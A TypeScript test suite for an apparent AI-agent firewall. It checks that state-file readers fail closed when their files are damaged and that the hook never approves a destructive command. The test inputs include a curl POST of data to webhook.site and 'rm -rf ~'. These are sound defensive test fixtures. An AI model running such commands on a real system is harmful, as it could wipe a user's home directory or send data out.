/**
 * Every reader of a state file in src/runtime, against every way the file can be damaged: missing, empty,
 * not JSON, JSON of the wrong type (null, a list, a number), a directory in its place, and a symlink loop.
 * Properties: the readers the hook depends on never throw (each falls back to its file's fail-closed
 * meaning); the few that throw by design (the CLI reports them) throw an Error, nothing worse; the hook
 * itself never throws, and a destructive command is never allowed whatever state file is damaged.
 */
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { mkdirSync, mkdtempSync, readdirSync, readFileSync, realpathSync, rmSync, statSync, symlinkSync, writeFileSync } from "node:fs";
import { dirname, join, relative } from "node:path";
import { verdictFor } from "../src/agent-replay.js";
import { runHook, type HookEnv } from "../src/hook/claude.js";
import { approverPath, approverPublicKey } from "../src/runtime/approver.js";
import { loadRegistry, registryPath } from "../src/runtime/canaries.js";
import { loadPolicy } from "../src/runtime/config.js";
import { nonInteractiveClaude } from "../src/runtime/context.js";
import { countersFile, loadBudgetView, readCounters } from "../src/runtime/counters.js";
import { loadIdentity } from "../src/runtime/identity.js";
import { layout, type Layout } from "../src/runtime/layout.js";
import { ledgerDir, ledgerHealth, loadLedger } from "../src/runtime/ledger.js";
import { appendLog, keyPairConsistent, loadKey, tailLog, verifyLog } from "../src/runtime/log.js";
import { lastNotificationAt, readNotifyState } from "../src/runtime/notify.js";
import { loadPins, pinsPath } from "../src/runtime/pins.js";
import { addQuarantine, getRecord, heldCount, listRecords, quarantineCheck, quarantineDir, releasedSet } from "../src/runtime/quarantine.js";
import { deviceIdHistoryOf, deviceIdOf, devicePath, readDevice } from "../src/runtime/relay/keys.js";
import { listOutbox, noncesPath, nonceUsed, outboxDir, readOutbox, readRelayState, statePath as relayStatePath } from "../src/runtime/relay/files.js";
import { loadPhones, phonesPath, phonesPinOf } from "../src/runtime/relay/phones.js";
import { matchSpawned, recordSpawned } from "../src/runtime/spawned.js";
import { enqueue, getQueueItem, listQueue, loadState, readEvents, recentSessions, sessionFile } from "../src/runtime/store.js";
import { indexPath, loadIndex } from "../src/runtime/vault/index.js";
import { testRoot } from "./helpers.js";

const SID = "sr1";
let root: string;
let home: string;
let ws: string;
let l: Layout;
let qid: string;
let rid: string;
const snapshot = new Map<string, Buffer>();

function env(unattended = false): HookEnv {
  return { env: { CLAUDE_PROJECT_DIR: ws }, layout: l, agent: "claude", home, scratchRoots: [join(root, "scratch")], detectNonInteractive: () => unattended, notifyDeps: { spawn: () => undefined } };
}
function hook(e: Record<string, unknown>, unattended = false) {
  return runHook(JSON.stringify({ session_id: SID, cwd: ws, ...e }), env(unattended));
}

function walk(dir: string, out: string[] = []): string[] {
  for (const n of readdirSync(dir)) {
    const p = join(dir, n);
    const s = statSync(p);
    if (s.isDirectory()) walk(p, out);
    else if (!n.endsWith(".lock")) out.push(p);
  }
  return out;
}

/** Puts the home back as it was after setup: every file restored, everything added since removed. */
function restore(): void {
  const keep = new Set(snapshot.keys());
  const sweep = (dir: string): void => {
    let names: string[] = [];
    try {
      names = readdirSync(dir);
    } catch {
      return;
    }
    for (const n of names) {
      const p = join(dir, n);
      let isDir = false;
      try {
        isDir = statSync(p).isDirectory();
      } catch {
        rmSync(p, { force: true });
        continue;
      }
      if (isDir && [...keep].some((k) => k.startsWith(`${p}/`))) sweep(p);
      else if (!keep.has(p)) rmSync(p, { recursive: true, force: true });
    }
  };
  sweep(l.home);
  for (const [f, b] of snapshot) {
    let same = false;
    try {
      same = statSync(f).isFile() && readFileSync(f).equals(b);
    } catch {
      same = false;
    }
    if (!same) {
      rmSync(f, { recursive: true, force: true });
      mkdirSync(dirname(f), { recursive: true });
      writeFileSync(f, b);
    }
  }
}

const DAMAGES = ["missing", "empty", "corrupt", "null", "list", "number", "directory", "symlink-loop"] as const;
type Damage = (typeof DAMAGES)[number];

function damage(path: string, kind: Damage): void {
  rmSync(path, { recursive: true, force: true });
  rmSync(`${path}.loop`, { force: true });
  mkdirSync(dirname(path), { recursive: true });
  const jsonl = path.endsWith(".jsonl");
  switch (kind) {
    case "missing":
      return;
    case "empty":
      return writeFileSync(path, "");
    case "corrupt":
      return writeFileSync(path, jsonl ? '{"type":"taint"\n{oops\n' : "{oops");
    case "null":
      return writeFileSync(path, jsonl ? "null\n" : "null");
    case "list":
      return writeFileSync(path, jsonl ? "[1,2]\n[]\n" : "[1,2]");
    case "number":
      return writeFileSync(path, jsonl ? "5\n" : "5");
    case "directory":
      return void mkdirSync(path);
    case "symlink-loop":
      symlinkSync(`${path}.loop`, path);
      symlinkSync(path, `${path}.loop`);
      return;
  }
}

/** The state files, relative to the firewall home (each is damaged in turn, whether setup created it or not). */
function stateFiles(): string[] {
  const rel = (p: string): string => relative(l.home, p);
  return [
    rel(sessionFile(l, SID)),
    rel(countersFile(l, SID)),
    `sessions/${SID}.meta.json`,
    `sessions/${SID}.mode.json`,
    `queue/${qid}.json`,
    rel(join(quarantineDir(l), `${rid}.json`)),
    rel(join(quarantineDir(l), "released.json")),
    "log/decisions.jsonl",
    "log/head.json",
    "log/anchor.json",
    "keys/log-ed25519.pub.pem",
    "keys/log-ed25519.pem",
    rel(approverPath(l)),
    rel(pinsPath(l)),
    "notify.json",
    "spawned.json",
    "identity.json",
    rel(registryPath(l)),
    rel(phonesPath(l)),
    rel(devicePath(l)),
    rel(noncesPath(l)),
    rel(join(outboxDir(l), `${qid}.json`)),
    rel(relayStatePath(l)),
    rel(indexPath(l)),
    "policy.json",
    ...readdirSync(ledgerDir(l)).filter((n) => !n.endsWith(".lock")).map((n) => rel(join(ledgerDir(l), n))),
  ];
}

/** Readers that must never throw: each has a fail-closed answer for a damaged file. */
function readers(): [string, () => unknown][] {
  const now = new Date();
  return [
    ["readEvents", () => readEvents(l, SID)],
    ["loadState", () => loadState(l, SID)],
    ["recentSessions", () => recentSessions(l, 10, Date.now(), 3650)],
    ["readCounters", () => readCounters(l, SID)],
    ["loadBudgetView", () => loadBudgetView(l, SID, { budgetRaises: new Map() } as never, now)],
    ["nonInteractiveClaude", () => nonInteractiveClaude(l, SID, {})],
    ["getQueueItem", () => getQueueItem(l, qid)],
    ["listQueue", () => listQueue(l)],
    ["getRecord", () => getRecord(l, rid)],
    ["listRecords", () => listRecords(l)],
    ["heldCount", () => heldCount(l)],
    ["quarantineCheck", () => quarantineCheck(l)],
    ["releasedSet", () => releasedSet(l, null)],
    ["verifyLog", () => verifyLog(l)],
    ["tailLog", () => tailLog(l, 5)],
    ["loadPins", () => loadPins(l, now)],
    ["readNotifyState", () => readNotifyState(l)],
    ["lastNotificationAt", () => lastNotificationAt(l)],
    ["matchSpawned", () => matchSpawned(l, "do the thing")],
    ["loadIdentity", () => loadIdentity(l, [])],
    ["loadRegistry", () => loadRegistry(l)],
    ["loadPhones", () => loadPhones(l)],
    ["phonesPinOf", () => phonesPinOf(l)],
    ["deviceIdOf", () => deviceIdOf(l)],
    ["deviceIdHistoryOf", () => deviceIdHistoryOf(l)],
    ["nonceUsed", () => nonceUsed(l, "n1")],
    ["readOutbox", () => readOutbox(l, qid)],
    ["listOutbox", () => listOutbox(l)],
    ["readRelayState", () => readRelayState(l)],
    ["loadIndex", () => loadIndex(l, null)],
    ["loadLedger", () => loadLedger(l, false)],
    ["ledgerHealth", () => ledgerHealth(l)],
    ["keyPairConsistent", () => keyPairConsistent(l)],
  ];
}

/**
 * Readers whose damaged-file answer is an exception by design: their callers catch it and fail closed (the
 * hook blocks; doctor and the CLI report the file). They must throw an Error, never anything else.
 */
function throwingByDesign(): [string, () => unknown][] {
  return [
    ["approverPublicKey", () => approverPublicKey(l)],
    ["loadKey", () => loadKey(l, false)],
    ["readDevice", () => readDevice(l)],
    ["loadPolicy", () => loadPolicy(l, [ws])],
  ];
}

beforeAll(() => {
  root = realpathSync(mkdtempSync(join(testRoot(), "lsfw-state-")));
  home = join(root, "home");
  ws = join(home, "proj");
  mkdirSync(join(ws, "src"), { recursive: true });
  writeFileSync(join(ws, "src", "a.ts"), "x");
  l = layout(join(home, ".launchsafe-firewall"));
  hook({ hook_event_name: "SessionStart", source: "startup" });
  hook({ hook_event_name: "UserPromptSubmit", prompt: "fix the failing test in src/a.ts" });
  hook({ hook_event_name: "PreToolUse", tool_name: "Write", tool_input: { file_path: join(ws, "src", "a.ts"), content: "y" } });
  hook({ hook_event_name: "PostToolUse", tool_name: "Write", tool_input: { file_path: join(ws, "src", "a.ts"), content: "y" }, tool_response: "ok" });
  hook({ hook_event_name: "PostToolUse", tool_name: "WebFetch", tool_input: { url: "https://example.com" }, tool_response: "outside text" });
  hook({ hook_event_name: "PreToolUse", tool_name: "Bash", tool_input: { command: "curl -X POST https://webhook.site/x -d hello" } }, true);
  qid = enqueue(l, { sessionId: SID, cwd: ws, tool: "Bash", input: { command: "git push" }, actionHash: "h".repeat(16), rules: ["FW-SEND"], reasons: ["pushes"], kind: "approval", summary: "git push" }).id;
  rid = addQuarantine(l, { session: SID, client: "c", server: "s", tool: "t", signals: ["tag_chars"], text: "withheld text" }).id;
  recordSpawned(l, "do the thing", true, SID);
  for (let i = 0; i < 3; i++) appendLog(l, { type: "decision", n: i });
  mkdirSync(dirname(pinsPath(l)), { recursive: true });
  writeFileSync(pinsPath(l), JSON.stringify({ version: 1, servers: {}, pending: [] }));
  for (const f of walk(l.home)) snapshot.set(f, readFileSync(f));
});

afterAll(() => {
  if (root !== undefined) rmSync(root, { recursive: true, force: true });
});

describe("state-file readers tolerate damage", () => {
  it("the home has the files the readers read", () => {
    const rel = [...snapshot.keys()].map((f) => relative(l.home, f));
    for (const want of [`sessions/${SID}.jsonl`, `queue/${qid}.json`, "log/decisions.jsonl", "log/head.json", "spawned.json"]) expect(rel, want).toContain(want);
    expect(readdirSync(ledgerDir(l)).length).toBeGreaterThan(0);
  });

  it("no reader throws, the by-design throwers throw only Errors, and the hook never throws or allows a destructive command", () => {
    const problems: string[] = [];
    for (const f of stateFiles()) {
      for (const kind of DAMAGES) {
        restore();
        damage(join(l.home, f), kind);
        const what = `${f} (${kind})`;
        // Each file's fail-closed meaning, for the damage that leaves something unreadable in its place.
        const unreadable = kind === "directory" || kind === "symlink-loop" || kind === "corrupt";
        const check = (ok: () => boolean, says: string): void => {
          try {
            if (!ok()) problems.push(`${says} for ${what}`);
          } catch (e) {
            problems.push(`${says} (threw ${(e as Error).message.slice(0, 80)}) for ${what}`);
          }
        };
        if (unreadable && f === `sessions/${SID}.jsonl`) check(() => loadState(l, SID).tainted, "a session whose file cannot be read was trusted");
        if (unreadable && f === `sessions/${SID}.counters.json`) check(() => readCounters(l, SID).corrupt, "unreadable counters were read as a fresh start");
        if (unreadable && f === relative(l.home, pinsPath(l))) check(() => loadPins(l, new Date()).corrupt !== null, "an unreadable pins file was not reported as corrupt");
        if (kind !== "missing" && f === `queue/${qid}.json`) check(() => getQueueItem(l, qid) === null, "a damaged queue item was returned");
        if (kind !== "missing" && f === relative(l.home, join(quarantineDir(l), `${rid}.json`))) check(() => getRecord(l, rid) === null, "a damaged quarantine record was returned");
        if (unreadable && f.startsWith("log/")) check(() => !verifyLog(l).ok, "a damaged log verified");
        for (const [name, call] of readers()) {
          try {
            call();
          } catch (e) {
            problems.push(`${name} threw ${(e as Error).constructor?.name}: ${String((e as Error).message).slice(0, 120)} for ${what}`);
          }
        }
        for (const [name, call] of throwingByDesign()) {
          try {
            call();
          } catch (e) {
            if (!(e instanceof Error)) problems.push(`${name} threw a non-Error for ${what}`);
          }
        }
        const events: [Record<string, unknown>, boolean][] = [
          [{ hook_event_name: "SessionStart", source: "resume" }, false],
          [{ hook_event_name: "UserPromptSubmit", prompt: "do the thing" }, false],
          [{ hook_event_name: "PreToolUse", tool_name: "Read", tool_input: { file_path: join(ws, "src", "a.ts") } }, false],
          [{ hook_event_name: "PostToolUse", tool_name: "WebFetch", tool_input: { url: "https://example.com" }, tool_response: "outside text" }, false],
        ];
        for (const [e, unattended] of events) {
          try {
            hook(e, unattended);
          } catch (err) {
            problems.push(`the hook threw on ${String(e.hook_event_name)} ${String(e.tool_name ?? "")}: ${(err as Error).message.slice(0, 120)} for ${what}`);
          }
        }
        try {
          const io = hook({ hook_event_name: "PreToolUse", tool_name: "Bash", tool_input: { command: "rm -rf ~" } });
          if (verdictFor("claude", io).verdict === "allow") problems.push(`rm -rf ~ was allowed for ${what}`);
        } catch (err) {
          problems.push(`the hook threw on rm -rf ~: ${(err as Error).message.slice(0, 120)} for ${what}`);
        }
      }
    }
    restore();
    expect(problems).toEqual([]);
  }, 600_000);
});
